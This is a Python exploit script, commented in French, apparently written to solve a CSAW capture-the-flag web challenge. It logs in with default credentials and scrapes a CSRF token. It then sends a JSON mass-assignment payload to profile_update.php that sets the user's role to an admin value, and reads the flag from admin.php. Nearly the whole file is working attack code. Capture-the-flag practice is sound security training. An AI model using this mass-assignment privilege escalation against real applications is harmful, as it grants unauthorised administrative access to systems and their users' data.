import requests
import json

# Configuration
BASE_URL = "http://juggler.chal.csaw.io"
SESSION = requests.Session()

# Étape 1: Se connecter avec un compte utilisateur
print("=== Étape 1: Connexion ===")
login_data = {
    "username": "user",
    "password": "user"
}
resp = SESSION.post(f"{BASE_URL}/login.php", data=login_data)
print(f"Status login: {resp.status_code}")
print(f"Cookies: {SESSION.cookies.get_dict()}")

# Vérifier si on est connecté
resp = SESSION.get(f"{BASE_URL}/dashboard.php")
print(f"Dashboard status: {resp.status_code}")

# Étape 2: Récupérer le csrf_token depuis la page dashboard
print("\n=== Étape 2: Récupération CSRF token ===")
import re
match = re.search(r'"csrf_token"\s*:\s*"([^"]+)"', resp.text)
if match:
    csrf_token = match.group(1)
    print(f"CSRF token: {csrf_token}")
else:
    # Essayer de trouver le token dans le HTML
    print("Token non trouvé dans le format attendu, cherchant autre part...")
    print(resp.text[:500])
    csrf_token = None

# Étape 3: Mettre à jour le rôle via mass assignment
if csrf_token:
    print("\n=== Étape 3: Mass Assignment ===")
    payload = {
        "role": "placeholder_admin_role1",
        "csrf_token": csrf_token
    }
    resp = SESSION.post(
        f"{BASE_URL}/profile_update.php",
        data=json.dumps(payload),
        headers={"Content-Type": "application/json"}
    )
    print(f"Status profile_update: {resp.status_code}")
    print(f"Response: {resp.text}")
    
    # Étape 4: Accéder à admin.php
    print("\n=== Étape 4: Accès admin ===")
    resp = SESSION.get(f"{BASE_URL}/admin.php")
    print(f"Status admin: {resp.status_code}")
    print(f"Flag: {resp.text}")
else:
    print("\nToken manquant, essayons sans...")
    payload = {"role": "placeholder_admin_role1"}
    resp = SESSION.post(
        f"{BASE_URL}/profile_update.php",
        data=json.dumps(payload),
        headers={"Content-Type": "application/json"}
    )
    print(f"Status: {resp.status_code}")
    print(f"Response: {resp.text}")